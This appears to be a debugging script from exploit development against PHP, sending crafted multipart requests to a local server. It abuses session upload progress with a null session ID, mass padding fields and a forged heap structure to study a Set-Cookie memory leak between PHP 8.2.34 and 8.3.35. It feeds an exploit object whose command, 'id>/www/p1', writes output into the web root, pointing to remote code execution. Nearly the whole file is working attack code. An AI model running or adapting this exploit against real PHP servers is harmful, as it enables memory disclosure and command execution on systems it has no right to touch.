#!/usr/bin/env python3
"""Dump the RAW stage-1 B-request response on 8.2.34 to see why the Set-Cookie
leak is empty (vs 8.3.35's 4096-byte spill)."""
import os
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit

PORT = 18111
t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=60, verbose=False)
ex = exploit.Exploit(t, "id>/www/p1", huge_mb=256, verbose=False, profile="bookworm")
ex.rotate()

# A request
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ex._file_part(), ex._big_field(),
]
respA = t.post(exploit.build_multipart(parts, b"S" * 17), b"S" * 17,
               read_cap=1 << 20, timeout=120)
first = respA.split(b"\r\n", 1)[0]
print(f"A-response: {len(respA)} bytes, first line: {first!r}", flush=True)
time.sleep(0.2)

# B request
parts = [
    {"name": "PHPSESSID", "data": exploit.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(ex.stage1_n):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
respB = t.post(exploit.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
print(f"\nB-response: {len(respB)} bytes", flush=True)
print("--- B headers ---", flush=True)
print(respB.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace"), flush=True)
import re
for m in re.finditer(rb"Set-Cookie: ([^\r\n]*)", respB):
    val = m.group(1)
    print(f"  Set-Cookie len={len(val)}: {val[:60]!r}", flush=True)
